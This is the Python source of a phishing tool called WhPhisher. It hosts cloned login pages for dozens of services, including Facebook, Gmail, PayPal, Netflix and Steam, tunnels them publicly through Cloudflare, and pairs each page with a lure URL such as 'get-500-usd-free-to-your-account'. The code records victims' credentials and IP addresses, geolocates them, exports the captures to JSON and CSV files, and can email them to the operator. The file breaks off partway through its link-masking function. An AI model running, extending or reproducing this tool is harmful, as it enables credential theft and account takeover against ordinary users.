# -*- coding: UTF-8 -*-
# Herramienta  : WhPhisher
# Author       : W
"""

{

__        ___     ____  _     _     _
\ \      / / |__ |  _ \| |__ (_)___| |__   ___ _ __
 \ \ /\ / /| '_ \| |_) | '_ \| / __| '_ \ / _ \ '__|
  \ V  V / | | | |  __/| | | | \__ \ | | |  __/ |
   \_/\_/  |_| |_|_|   |_| |_|_|___/_| |_|\___|_|

Phishing tool
I am not responsible for the misuse that can be given when editing this code: v

"""

import os, sys, time, socket, json, csv, uuid, shutil
from os import popen, system
from time import sleep
from datetime import datetime
from urllib.request import urlopen
import configparser
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Normal
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\33[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"

# Configuration defaults
config = {
    'port': 8080,
    'email_enabled': False,
    'email_to': '',
    'email_from': '',
    'email_password': '',
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'geolocation': True,
    'qr_code': True,
    'auto_export': True,
    'cache_sites': True
}

# Session tracking
sessions = {}
click_counter = 0
white="\033[0;37m"
bwhite="\033[1;37m"

nc="\033[00m"

version="2.5"

ask = bgreen + '[' + bwhite + '-' + bgreen + '] '+ byellow
success = byellow + '[' + bwhite + '√' + byellow + '] '+bgreen
error = bblue + '[' + bwhite + '!' + bblue + '] '+bred
info= byellow + '[' + bwhite + '+' + byellow + '] '+ bcyan
info2= bgreen + '[' + bwhite + '•' + bgreen + '] '+ bpurple

# Logo
logo=f'''

{white}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                          
  ▄▄▄▄▄▄                    ▄   ▄▄▄▄ ▄▄                   
 █▀██▀▀██                   ▀██████▀  ██    █▄       █▄   
   ██   ██       ▄     ▄▄     ██   ▄  ██ ▀▀▄██▄      ██   
   ██   ██ ▄▀▀█▄ ████▄ ██ ▄█▀ ██  ██  ██ ██ ██ ▄███▀ ████▄
 ▄ ██   ██ ▄█▀██ ██    ████   ██  ██  ██ ██ ██ ██    ██ ██
 ▀██▀███▀ ▄▀█▄██▄█▀   ▄██ ▀█▄ ▀█████ ▄██▄██▄██▄▀███▄▄██ ██
                              ▄   ██                      
                              ▀████▀                        {bred}v.1.0

{byellow}----> {bcyan}By {bwhite}DarkGlitch {bcyan}Github {bwhite}LaVenGanzaDelLadron {byellow}<-----

{white}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'''

sites=["Facebook Traditional", "Facebook Voting","Facebook Security", "Messenger", "Instagram Traditional", "Insta Auto Followers", "Insta 1000 Followers", "Insta Blue Verify", "Gmail Old", "Gmail New","Gmail Poll","Microsoft","Netflix","Paypal","Steam","Twitter","PlayStation","TikTok","Twitch","Pinterest","SnapChat", "LinkedIn","Ebay","Quora","Protonmail","Spotify","Reddit","Adobe","DevianArt","Badoo","Clash Of Clans","Ajio","JioRouter","FreeFire","Pubg","Telegram","Youtube","Airtel","SocialClub","Ola","Outlook","Amazon","Origin","DropBox","Yahoo","WordPress","Yandex","StackOverflow","VK","VK Poll","Xbox","Mediafire","Gitlab","Github","Apple","iCloud","Shopify","Myspace","Shopping","Cryptocurrency","SnapChat2","Verizon","Wi-Fi","Discord","Roblox","Custom"]

pkgs=[ "php", "curl", "wget", "unzip" ]

socket.setdefaulttimeout(30)

root= popen("cd $HOME && pwd").read().strip()


# Check termux
if os.path.exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False

# Website chooser
def options():
    total = len(sites)
    term_width = shutil.get_terminal_size((100, 20)).columns
    column_gap = 4

    # Fit as many columns as possible (up to 3) based on visible text width.
    selected_cols = 1
    selected_rows = total
    selected_widths = []
    for cols in range(3, 0, -1):
        rows = (total + cols - 1) // cols
        col_widths = []
        for col in range(cols):
            start = col * rows
            end = min(start + rows, total)
            width = 0
            for idx in range(start, end):
                label = f"[{idx+1}] {sites[idx]}"
                if len(label) > width:
                    width = len(label)
            col_widths.append(width)

        needed_width = sum(col_widths) + (cols - 1) * column_gap
        if needed_width <= term_width or cols == 1:
            selected_cols = cols
            selected_rows = rows
            selected_widths = col_widths
            break

    for row in range(selected_rows):
        line = ""
        for col in range(selected_cols):
            idx = col * selected_rows + row
            if idx >= total:
                continue

            plain_label = f"[{idx+1}] {sites[idx]}"
            colored_label = green + "[" + bwhite + str(idx + 1) + bgreen + "] " + bcyan + sites[idx]
            line += colored_label

            if col < selected_cols - 1:
                pad = selected_widths[col] - len(plain_label) + column_gap
                line += " " * max(pad, column_gap)
        print(line)
    print()
    print(green+'['+bwhite+'x'+bgreen+']'+byellow+' About                  '+bgreen+'['+bwhite+'m'+bgreen+']'+byellow+' More tools       '+bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Exit')
    print()

# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")

# Update of WhPhisher
def update():
    internet()
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/WhBeatZ/WhPhisher/main/files/version.txt").read().strip()
    if (version != git_ver and git_ver != "404: Not Found"):
        system("clear")
        changelog=popen("curl -s -N https://raw.githubusercontent.com/WhBeatZ/WhPhisher/main/files/changelog.log").read()
        print(logo)
        print(f"{info}WhPhisher has an update available!\n{info2}Current: {bred}{version}\n{info}Available: {bgreen}{git_ver}\n")
        upask=input(ask+"Do you want to update WhPhisher (recommended) press [y] to update or [n] to cancel --> "+bwhite)
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf WhPhisher && git clone https://github.com/WhBeatZ/WhPhisher.git && cd WhPhisher && python3 WhPhisher.py")
            sprint("\n"+success+"WhPhisher installed successfully :)!! Restart the terminal :D!\n")

            if (changelog != "404: Not Found"):
                print(info2+"Changes :D:\n"+bcyan+changelog)
            exit()
        elif upask=="n":
            print("\n"+info+"Update cancelled, using the old version :(!")
            sleep(2)
        else:
            print("\n"+error+"Not available!\n")
            sleep(2)

# Print logo
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.001)

# Print lines
def sprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)

# Load configuration
def load_config():
    global config
    config_file = 'whphisher_config.ini'
    if os.path.exists(config_file):
        parser = configparser.ConfigParser()
        parser.read(config_file)
        if 'SETTINGS' in parser:
            config['port'] = parser.getint('SETTINGS', 'port', fallback=8080)
            config['email_enabled'] = parser.getboolean('SETTINGS', 'email_enabled', fallback=False)
            config['geolocation'] = parser.getboolean('SETTINGS', 'geolocation', fallback=True)
            config['qr_code'] = parser.getboolean('SETTINGS', 'qr_code', fallback=True)
            config['auto_export'] = parser.getboolean('SETTINGS', 'auto_export', fallback=True)
            config['cache_sites'] = parser.getboolean('SETTINGS', 'cache_sites', fallback=True)
        if 'EMAIL' in parser:
            config['email_to'] = parser.get('EMAIL', 'to', fallback='')
            config['email_from'] = parser.get('EMAIL', 'from', fallback='')
            config['email_password'] = parser.get('EMAIL', 'password', fallback='')
            config['smtp_server'] = parser.get('EMAIL', 'smtp_server', fallback='smtp.gmail.com')
            config['smtp_port'] = parser.getint('EMAIL', 'smtp_port', fallback=587)
        sprint(info+"Configuration loaded from "+config_file)
    else:
        create_default_config()

# Create default configuration file
def create_default_config():
    config_file = 'whphisher_config.ini'
    parser = configparser.ConfigParser()
    parser['SETTINGS'] = {
        'port': '8080',
        'email_enabled': 'False',
        'geolocation': 'True',
        'qr_code': 'True',
        'auto_export': 'True',
        'cache_sites': 'True'
    }
    parser['EMAIL'] = {
        'to': 'your_email@example.com',
        'from': 'sender@example.com',
        'password': 'your_password',
        'smtp_server': 'smtp.gmail.com',
        'smtp_port': '587'
    }
    with open(config_file, 'w') as f:
        parser.write(f)
    sprint(info+"Default configuration file created: "+config_file)

# Get geolocation from IP
def get_geolocation(ip):
    if not config['geolocation']:
        return {}
    try:
        response = urlopen(f'http://ip-api.com/json/{ip}', timeout=5)
        data = json.loads(response.read().decode('utf-8'))
        if data['status'] == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'region': data.get('regionName', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0)
            }
    except:
        pass
    return {}

# Generate QR Code for URL (ASCII art version)
def generate_qr_ascii(url):
    if not config['qr_code']:
        return
    try:
        # Try to use qrcode library if available
        try:
            import qrcode
            qr = qrcode.QRCode(version=1, box_size=1, border=1)
            qr.add_data(url)
            qr.make(fit=True)
            qr.print_ascii()
        except ImportError:
            sprint(info2+"QR code library not installed. Run: pip install qrcode")
            sprint(info2+"Generating simple link instead...")
    except Exception as e:
        sprint(error+f"QR code generation failed: {str(e)}")

# Export data to JSON
def export_to_json(data, filename='capture_data.json'):
    try:
        existing_data = []
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                existing_data = json.load(f)
        existing_data.append(data)
        with open(filename, 'w') as f:
            json.dump(existing_data, f, indent=4)
        return True
    except Exception as e:
        sprint(error+f"JSON export failed: {str(e)}")
        return False

# Export data to CSV
def export_to_csv(data, filename='capture_data.csv'):
    try:
        file_exists = os.path.exists(filename)
        with open(filename, 'a', newline='', encoding='utf-8') as f:
            fieldnames = ['timestamp', 'type', 'data', 'ip', 'country', 'city', 'session_id']
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            if not file_exists:
                writer.writeheader()
            writer.writerow(data)
        return True
    except Exception as e:
        sprint(error+f"CSV export failed: {str(e)}")
        return False

# Send email notification
def send_email_notification(subject, body):
    if not config['email_enabled']:
        return
    try:
        msg = MIMEMultipart()
        msg['From'] = config['email_from']
        msg['To'] = config['email_to']
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP(config['smtp_server'], config['smtp_port'])
        server.starttls()
        server.login(config['email_from'], config['email_password'])
        server.send_message(msg)
        server.quit()
        sprint(info+"Email notification sent successfully!")
    except Exception as e:
        sprint(error+f"Email notification failed: {str(e)}")

# Generate session ID
def generate_session_id():
    return str(uuid.uuid4())[:8]

# Track click
def track_click(url):
    global click_counter, sessions
    click_counter += 1
    session_id = generate_session_id()
    sessions[session_id] = {
        'url': url,
        'timestamp': datetime.now().isoformat(),
        'clicks': click_counter
    }
    sprint(info2+f"Session ID: {session_id} | Total clicks: {click_counter}")
    return session_id

# Internet Checker
def internet(host="8.8.8.8", port=53, timeout=5, retries=3):
    attempt = 0
    while attempt < retries:
        try:
            socket.setdefaulttimeout(timeout)
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
            return True
        except socket.error:
            attempt += 1
            if attempt < retries:
                sprint(error+f"No internet :c | Retry {attempt}/{retries}...")
                time.sleep(2)
            else:
                sprint(error+"No internet connection. Please check your network and try again.")
                choice = input(ask+"Press [r] to retry or [q] to quit > ")
                if choice.lower() == 'r':
                    return internet(host, port, timeout, retries)
                else:
                    pexit()
    return False

# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
            result = system(pm+" install -y "+pkgs[pkg])
            if result != 0:
                sprint(error+f"Failed to install {pkgs[pkg]}. Please install manually.")
                return False
    return True

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint(info+"Instalando "+pkgs[pkg].upper()+nc)
            system("sudo "+pm+" install -y "+pkgs[pkg])


# Ask to mask url
def cuask(url):
    cust= input("\n"+ask+bcyan+"Press (" +bwhite+ "y" +bcyan+") to customize the" +byellow+ " link" +bcyan+" or (" +bwhite+ "ENTER" +bcyan+ ") to continue without changes" +byellow+ " -->" +bwhite+ "  ")
    if not cust=="":
        masking(url)
    waiter()

# Polite Exit
def pexit():
    killer()
    sprint("\n"+info2+bcyan+"Thanks for using " +bwhite+ "WhPhisher! " +bcyan+ "By DarkGlitch" +byellow+ "--> " +bwhite+ "LaVenGanzaDelLadron" +bcyan+ " :D\n"+nc)
    exit(0)


# Info about tool
def about():
    system("clear")
    slowprint(logo)
    print(bcyan+'[Tool Name]  '+bpurple+' :[WhPhisher] ')
    print(bcyan+'[Version]   '+bpurple+'                 :[2.5 Enhanced]')
    print(bcyan+'[Author]    '+bpurple+'                 :[WhBeatZ] ')
    print(bcyan+'[Github]    '+bpurple+'                 :[https://github.com/WhBeatZ] ')
    print(bcyan+'[Instagram] '+bpurple+'                 :[WhBeatZ]  ')
    print()
    print(bgreen+'['+bwhite+'s'+bgreen+']'+byellow+' Statistics & Config       ')
    print(bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Exit                     '+     bgreen+'['+bwhite+'99'+bgreen+']'+byellow+'  Main Menu       ')
    print()
    abot= input("\n > ")
    if abot== "0":
        pexit()
    elif abot== "s" or abot== "S":
        show_statistics()
    else:
        main()

# Show statistics and configuration
def show_statistics():
    system("clear")
    slowprint(logo)
    print(bcyan+"\n========== STATISTICS & CONFIGURATION ==========\n")
    
    # Show configuration
    print(bpurple+"[Configuration]"+bwhite)
    print(f"  Port: {config['port']}")
    print(f"  Geolocation: {'Enabled' if config['geolocation'] else 'Disabled'}")
    print(f"  QR Code: {'Enabled' if config['qr_code'] else 'Disabled'}")
    print(f"  Auto Export: {'Enabled' if config['auto_export'] else 'Disabled'}")
    print(f"  Email Alerts: {'Enabled' if config['email_enabled'] else 'Disabled'}")
    print(f"  Cache Sites: {'Enabled' if config['cache_sites'] else 'Disabled'}")
    
    # Show session statistics
    print(f"\n{bpurple}[Session Statistics]{bwhite}")
    print(f"  Total Clicks Tracked: {click_counter}")
    print(f"  Active Sessions: {len(sessions)}")
    
    # Show captured data statistics
    if os.path.exists('capture_data.json'):
        try:
            with open('capture_data.json', 'r') as f:
                data = json.load(f)
                print(f"  Total Captures: {len(data)}")
                credentials = sum(1 for item in data if item.get('type') == 'credentials')
                ips = sum(1 for item in data if item.get('type') == 'ip')
                print(f"  Credentials Captured: {credentials}")
                print(f"  IPs Captured: {ips}")
        except:
            pass
    
    # Show files
    print(f"\n{bpurple}[Output Files]{bwhite}")
    files = ['usernames.txt', 'ip.txt', 'capture_data.json', 'capture_data.csv', 'url_analytics.json']
    for file in files:
        if os.path.exists(file):
            size = os.path.getsize(file)
            print(f"  {file}: {size} bytes")
    
    print(f"\n{bcyan}{'='*48}\n")
    input(ask+"Press ENTER to continue...")
    about()

# First function main
def main():
    internet()
    load_config()  # Load configuration file
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
            system("pkg install curl")
            system("pkg install ssh")
            system("pkg install openssh")
            system("pkg install bash")
            system("pkg upgrade && update")
    if True:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
                    sprint("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
                    system("sudo pacman -S "+pkgs[pkg]+" --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint("\n"+error+"Unsupported package manager. Install packages manually!"+nc)
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(error+"PHP cannot be installed. Install it manually!")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(error+"Unzip cannot be installed. Install it manually!")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(error+"Curl cannot be installed. Install it manually!")
        exit(1)
    killer()
    x=popen("uname -m").read()
    y=popen("uname").read()
    if not os.path.isfile(root+"/.cffolder/cloudflared"):
        sprint("\n"+info+"Downloading Cloudflare :D ....."+nc)
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
            elif x.find("arm64")!=-1:
                print(f"{error}Cloudflared not available for device architecture!")
                sleep(3)
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("mkdir $HOME/.cffolder")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(error+"Previous php still running! Please restart terminal and try again"+nc)
        exit()

    while True:
        if os.path.exists("/.site"):
            system("rm -rf $HOME/.site && cd $HOME && mkdir .site")
            break
        else:
            system("cd $HOME && mkdir .site")
            break
    while True:
        os.system("clear")
        slowprint(logo)
        options()

        choose= input(ask+"Select a number :) > "+nc)
        if choose=="1" or choose == "01":
            folder="facebook"
            mask="https://blue-verified-facebook-free"
            requirements(folder,mask)
        elif choose == "2" or choose == "02":
            folder="fb_advanced"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "3" or choose == "03":
            folder="fb_security"
            mask='https://make-your-facebook-secured-and-free-from-hackers'
            requirements(folder,mask)
        elif choose == "4" or choose == "04":
            folder="fb_messenger"
            mask='https://get-messenger-premium-features-free'
            requirements(folder,mask)
        elif choose == "5" or choose == "05":
            folder="instagram"
            mask='https://get-unlimited-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "6" or choose== "06":
            folder="ig_followers"
            mask='https://get-unlimited-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "7" or choose == "07":
            folder="insta_followers"
            mask='https://get-1000-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "8" or choose == "08":
            folder="ig_verify"
            mask='https://blue-badge-verify-for-instagram-free'
            requirements(folder,mask)
        elif choose == "9" or choose == "09":
            folder="google"
            mask='https://get-unlimited-google-drive-free'
            requirements(folder,mask)
        elif choose == "10":
            folder="google_new"
            mask='https://get-unlimited-google-drive-free'
            requirements(folder,mask)
        elif choose == "11":
            folder="google_poll"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "12":
            folder="microsoft"
            mask='https://unlimited-onedrive-space-for-free'
            requirements(folder,mask)
        elif choose == "13":
            folder="netflix"
            mask='https://upgrade-your-netflix-plan-free'
            requirements(folder,mask)
        elif choose == "14":
            folder="paypal"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose == "15":
            folder="steam"
            mask='https://steam-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose == "16":
            folder="twitter"
            mask='https://get-blue-badge-on-twitter-free'
            requirements(folder,mask)
        elif choose == "17":
            folder="playstation"
            mask='https://playstation-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose == "18":
            folder="tiktok"
            mask='https://tiktok-free-liker'
            requirements(folder,mask)
        elif choose == "19":
            folder="twitch"
            mask='https://unlimited-twitch-tv-user-for-free'
            requirements(folder,mask)
        elif choose == "20":
            folder="pinterest"
            mask='https://get-a-premium-plan-for-pinterest-free'
            requirements(folder,mask)
        elif choose == "21":
            folder="snapchat"
            mask='https://view-locked-snapchat-accounts-secretly'
            requirements(folder,mask)
        elif choose == "22":
            folder="linkedin"
            mask='https://get-a-premium-plan-for-linkedin-free'
            requirements(folder,mask)
        elif choose == "23":
            folder="ebay"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose == "24":
            folder="quora"
            mask='https://quora-premium-for-free'
            requirements(folder,mask)
        elif choose == "25":
            folder="protonmail"
            mask='https://protonmail-pro-basics-for-free'
            requirements(folder,mask)
        elif choose == "26":
            folder="spotify"
            mask='https://convert-your-account-to-spotify-premium'
            requirements(folder,mask)
        elif choose == "27":
            folder="reddit"
            mask='https://reddit-official-verified-member-badge'
            requirements(folder,mask)
        elif choose == "28":
            folder="adobe"
            mask='https://get-adobe-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose == "29":
            folder="deviantart"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "30":
            folder="badoo"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "31":
            folder="clashofclans"
            mask='https://get-unlimited-gems-in-your-coc-account'
            requirements(folder,mask)
        elif choose == "32":
            folder="ajio"
            mask='https://get-limited-time-discount'
            requirements(folder,mask)
        elif choose == "33":
            folder="jiorouter"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "34":
            folder="freefire"
            mask='https://get-unlimited-diamonds-in-your-ff-account'
            requirements(folder,mask)
        elif choose == "35":
            folder="pubg"
            mask='https://get-unlimited-diamonds-in-your-pubg-account'
            requirements(folder,mask)
        elif choose == "36":
            folder="telegram"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "37":
            folder="youtube"
            mask='https://get-1k-like-in-any-video'
            requirements(folder,mask)
        elif choose == "38":
            folder="airtelsim"
            mask='https://get-500-cureency-free-to-your-account'
            requirements(folder,mask)
        elif choose == "39":
            folder="socialclub"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "40":
            folder="ola"
            mask='https://book-a-cab-in-discount'
            requirements(folder,mask)
        elif choose == "41":
            folder="outlook"
            mask='https://grab-mail-from-anyother-outlook-account-free'
            requirements(folder,mask)
        elif choose == "42":
            folder="amazon"
            mask='https://get-limited-time-discount-free'
            requirements(folder,mask)
        elif choose == "43":
            folder="origin"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "44":
            folder="dropbox"
            mask='https://get-1TB-cloud-storage-free'
            requirements(folder,mask)
        elif choose == "45":
            folder="yahoo"
            mask='https://grab-mail-from-anyother-yahoo-account-free'
            requirements(folder,mask)
        elif choose == "46":
            folder="wordpress"
            mask='https://unlimited-wordpress-traffic-free'
            requirements(folder,mask)
        elif choose == "47":
            folder="yandex"
            mask='https://grab-mail-from-anyother-yandex-account-free'
            requirements(folder,mask)
        elif choose == "48":
            folder="stackoverflow"
            mask='https://get-stackoverflow-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose == "49":
            folder="vk"
            mask='https://vk-premium-real-method-2020'
            requirements(folder,mask)
        elif choose == "50":
            folder="vk_pole"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "51":
            folder="xbox"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "52":
            folder="mediafire"
            mask='https://get-1TB-on-mediafire-free'
            requirements(folder,mask)
        elif choose == "53":
            folder="gitlab"
            mask='https://get-1k-followers-on-gitlab-free'
            requirements(folder,mask)
        elif choose == "54":
            folder="github"
            mask='https://get-1k-followers-on-github-free'
            requirements(folder,mask)
        elif choose == "55":
            folder="apple"
            mask='https://get-apple-premium-account-free'
            requirements(folder,mask)
        elif choose == "56":
            folder="icloud"
            mask='https://unlimited-storage-icloud-free'
            requirements(folder,mask)
        elif choose == "57":
            folder="shopify"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "58":
            folder="myspace"
            mask='https://get-1k-followers-on-myspace-free-free'
            requirements(folder,mask)
        elif choose == "59":
            folder="shopping"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "60":
            folder="cryptocurrency"
            mask='https://get-bitcoins-free'
            requirements(folder,mask)
        elif choose == "61":
            folder="snapchat2"
            mask='https://view-locked-snapchat-accounts-secretly'
            requirements(folder,mask)
        elif choose == "62":
            folder="verizon"
            mask='https://get-verizon-premium-account-free'
            requirements(folder,mask)
        elif choose == "63":
            folder="wifi"
            mask='https://reconnect-your-wifi'
            requirements(folder,mask)
        elif choose == "64":
            folder="discord"
            mask='https://security-bot-for-your-discord-free'
            requirements(folder,mask)
        elif choose == "65":
            folder="roblox"
            mask='https://play-premium-games-for-free'
            requirements(folder,mask)
        elif choose == "66":
            customfol()
        elif choose == "x" or choose == "X":
            about()
        elif choose == "m" or choose == "M":
            main()
        elif choose=="0":
            pexit()
        else:
            sprint("\n"+error+"Not available :v")
            main()

# Copy website files from custom location
def customfol():
    fol=input("\n"+ask+"Enter the directory > "+green)
    if os.path.exists(fol):
        if os.path.isfile(fol+"/index.php"):
            system("cd "+fol+" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site")
            server()
        else:
            sprint(error+"Index.php required but not found!")
            main()
    else:
        sprint(error+"Directory do not exists!")
        main()

# 2nd function checking requirements and download files 
def requirements(folder,mask):
    cache_enabled = config.get('cache_sites', True)
    
    if os.path.isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        os.remove("websites.zip")
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            sprint(info2+f"Using cached site: {folder}")
            break
        else:
            internet()
            sprint("\n"+info+"Downloading required files :D.....\n")
            system("rm -rf site.zip")
            
            # Show progress
            sprint(info2+"Fetching site template...")
            result = system("wget -q --show-progress https://github.com/WhBeatZ/fileswh/raw/main/phishingsites/"+folder+".zip -O site.zip")
            
            if result != 0:
                sprint(error+"Download failed. Retrying...")
                sleep(2)
                result = system("wget -q --show-progress https://github.com/WhBeatZ/fileswh/raw/main/phishingsites/"+folder+".zip -O site.zip")
                if result != 0:
                    sprint(error+"Failed to download site template. Please check your internet connection.")
                    main()
                    return
            
            if not os.path.exists("/.websites"):
                system("cd $HOME && mkdir .websites")
            
            if cache_enabled:
                system("cd $HOME/.websites && mkdir "+folder)
                system("unzip site.zip -d $HOME/.websites/"+folder)
                sprint(info2+"Site cached for future use")
            else:
                system("unzip site.zip -d $HOME/.site")
            
            if os.path.exists("site.zip"):
                os.remove("site.zip")
            
            if cache_enabled:
                system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            
            sprint(success+"Site template loaded successfully!")
            break
    with open(".info.txt", "w") as inform:
        inform.write(mask)
    system("mv -f .info.txt $HOME/.site")
    server()

# Start server and tunneling
def server():
    system("clear")
    slowprint(logo)
    if termux:
        sprint("\n"+info+"WhPhisher, the best phishing tool :D")
        sleep(1)
    
    # Use configured port
    port = config['port']
    sprint(f"\n{info2}Starting PHP server on localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S 127.0.0.1:{port} > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system(f"curl --output /dev/null --silent --head --fail 127.0.0.1:{port}"):
            sprint("\n"+info+"PHP server started successfully :)")
            break
        else:
            sprint(error+"PHP Error")
            killer()
            exit(1)
    sprint("\n"+info2+"Starting tunneling with the same address :D.....")
    internet()
    system("rm -fr $HOME/.cffolder/log.txt")
    while True:
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:{port} --logfile log.txt > /dev/null 2>&1 &")
            break
        else:
            system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url 127.0.0.1:{port} --logfile log.txt > /dev/null 2>&1 &")
            break
    sleep(9)
    cflink=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    if cflink.find("cloudflare")!=-1:
        cfcheck=True
    else:
        cfcheck=False
    while True:
        if cfcheck:
            url_manager(cflink, "1" , "2")
            cuask(cflink)
            break
        elif not cfcheck:
            url_manager(cflink, "1" , "2")
            cuask(cflink)

# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url
    internet()
    main1= os.popen("curl -s "+website)
    main2=main1.read()
